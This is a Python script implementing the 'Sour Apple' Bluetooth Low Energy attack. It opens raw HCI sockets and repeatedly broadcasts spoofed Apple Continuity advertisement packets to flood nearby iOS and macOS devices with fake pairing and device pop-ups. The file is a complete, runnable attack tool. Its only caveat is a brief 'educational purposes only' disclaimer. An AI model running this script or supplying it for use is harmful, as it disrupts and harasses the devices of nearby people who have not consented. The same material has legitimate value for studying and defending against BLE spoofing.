"""
Apple Advertisement Spam BLE Attack

This script broadcasts fake Apple device BLE advertisements (similar to AirTags, Apple TVs, etc.)
to nearby Apple devices. Based on JammyTools sour.py (Sour Apple Attack).

It exploits Apple's proximity discovery protocol by sending spoofed advertisement packets
that trigger notifications on nearby iOS and macOS devices.

WARNING: This is for educational purposes only. Use responsibly and only on devices
you own or have permission to test.
"""

from ui import RED, GREEN, BLUE, CYAN, WHITE, YELLOW, RESET, BRIGHT
import time
import os
import struct
import fcntl
import array
import socket
import threading
from errno import EALREADY
import bluetooth._bluetooth as bluez
from time import sleep
import random
import sys

# Apple device type IDs (used in manufacturer data)
APPLE_TYPES = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]


def enable_hci_device(device_id):
    """Enable and prepare HCI device for advertising."""
    try:
        raw_socket = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        hci_data = struct.pack("H", device_id)
        hci_req = array.array("b", hci_data)
        fcntl.ioctl(raw_socket.fileno(), bluez.HCIDEVUP, hci_req[0])
    except IOError as ioerr:
        if ioerr.errno != EALREADY:
            raise
    finally:
        raw_socket.close()


def build_apple_adv(dev_id):
    """Generate Apple advertisement packet."""
    typ = random.choice(APPLE_TYPES)
    payload = (16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, typ,
               random.randint(0, 255), random.randint(0, 255), random.randint(0, 255),
               0x00, 0x00, 0x10, random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    return payload


def send_adv_on_device(sock, delay=1):
    """Send Apple advertisement on specified socket."""
    pkt = build_apple_adv(sock)
    
    cfg = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
    cmd = struct.pack("<HHBBB6BBB", *cfg)
    bluez.hci_send_cmd(sock, 0x08, 0x0006, cmd)
    time.sleep(0.01)
    
    on_cmd = struct.pack("<B", 0x01)
    bluez.hci_send_cmd(sock, 0x08, 0x000A, on_cmd)
    time.sleep(0.01)
    
    pkt_cmd = struct.pack("<B%dB" % len(pkt), len(pkt), *pkt)
    bluez.hci_send_cmd(sock, 0x08, 0x0008, pkt_cmd)
    time.sleep(0.01)
    
    sleep(delay)
    
    off_cmd = struct.pack("<B", 0x00)
    bluez.hci_send_cmd(sock, 0x08, 0x000A, off_cmd)
    time.sleep(0.01)


def ad_spam(device_ids, duration=60, interval=0.1):
    """
    Apple advertisement spam execution.
    
    Args:
        device_ids (list): Target HCI devices
        duration (int): Runtime in seconds
        interval (float): Packet interval in seconds
    """
    
    print(f"{GREEN}{BRIGHT}Sour Apple Attack Initiated...{RESET}{BLUE}")
    
    socks = []
    
    try:
        for dev_label in device_ids:
            dev_id = int(dev_label.replace("hci", ""))
            print(f"Setting up {dev_label}...")
            enable_hci_device(dev_id)
            try:
                s = bluez.hci_open_dev(dev_id)
                socks.append((dev_label, s))
            except Exception as ex:
                print(f"{RED}HCI open failed on {dev_label}: {ex}{RESET}")
        
        if not socks:
            print(f"{RED}No Bluetooth devices available!{RESET}")
            return
        
        print(f"{GREEN}Hold on tight, we are flying far away!{RESET}")
        print(f"{CYAN}Broadcasting Apple device advertisements...{RESET}")
        print(f"{YELLOW}Duration: {duration} seconds, Interval: {interval} seconds{RESET}")
        print(f"{YELLOW}TIP: For better results, keep interval at 0.1-0.5 seconds{RESET}\n")
        
        tick = time.time()
        pkt_count = 0
        burst_no = 0
        
        while time.time() - tick < duration:
            burst_no += 1
            
            for dev_label, sock in socks:
                try:
                    send_adv_on_device(sock, delay=interval)
                    pkt_count += 1
                    
                    if pkt_count % 10 == 0:
                        elapsed = time.time() - tick
                        print(f"{CYAN}Packets: {pkt_count} | Bursts: {burst_no} | Elapsed: {elapsed:.1f}s{RESET}", end='\r')
                    
                except Exception as ex:
                    print(f"{RED}Tx error on {dev_label}: {ex}{RESET}")
        
        print()
        print(f"\n{GREEN}Attack completed!{RESET}")
        print(f"{CYAN}Total packets sent: {pkt_count}{RESET}")
        print(f"{CYAN}Total bursts: {burst_no}{RESET}")
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Attack interrupted by user{RESET}")
    except Exception as ex:
        print(f"{RED}An error occurred: {ex}{RESET}")
    finally:
        for dev_label, sock in socks:
            try:
                cmd = struct.pack("<B", 0x00)
                bluez.hci_send_cmd(sock, 0x08, 0x000A, cmd)
                sock.close()
            except:
                pass
        
        print(f"{BLUE}Cleaned up resources.{RESET}")


if __name__ == "__main__":
    devs = sys.argv[1:] if len(sys.argv) > 1 else ["hci0"]
    ad_spam(device_ids=devs, duration=60, interval=0.1)
